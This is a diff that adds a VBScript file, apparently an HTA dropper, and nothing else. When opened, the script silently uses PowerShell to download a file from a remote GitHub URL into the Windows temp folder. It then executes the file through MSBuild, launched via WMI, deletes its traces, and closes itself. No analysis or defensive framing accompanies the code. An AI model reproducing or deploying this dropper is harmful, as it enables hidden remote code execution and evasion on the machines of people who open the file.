@@ -1,0 +1,18 @@
+
+<script language="VBScript">
+Sub Run_PS_Script()
+    Dim WshShell,Command,PSFile,return,download,psdl,delete1,delete2,run1,run2
+	psdl = "powershell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/VinDizel-dotcom/CanYouBelieveIt/main/VljpB2D.TMP','C:\Windows\Temp\VljpB2D.TMP');"
+	Set WshShell = CreateObject("WScript.Shell")
+	download = WshShell.Run(psdl,0,True)
+	Command = "cmd /c echo Invoke-WmiMethod -Computername localhost -Name Create -Class Win32_PROCESS 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\VljpB2D.TMP /noconsolelogger' > C:\Windows\Temp\ccd.ps1"
+    PSFile = WshShell.Run(Command,0,True)
+    return = WshShell.Run("powershell.exe -ExecutionPolicy Unrestricted -File C:\Windows\Temp\ccd.ps1", 0, true)
+	delete1 = "cmd /c del /f C:\Windows\Temp\ccd.ps1"
+	delete2 = "cmd /c del /f C:\Windows\Temp\VljpB2D.TMP"
+	run1 = WshShell.Run(delete1,0,True)
+	run2 = WshShell.Run(delete2,0,True)
+End Sub
+Run_PS_Script
+self.close
+</script>
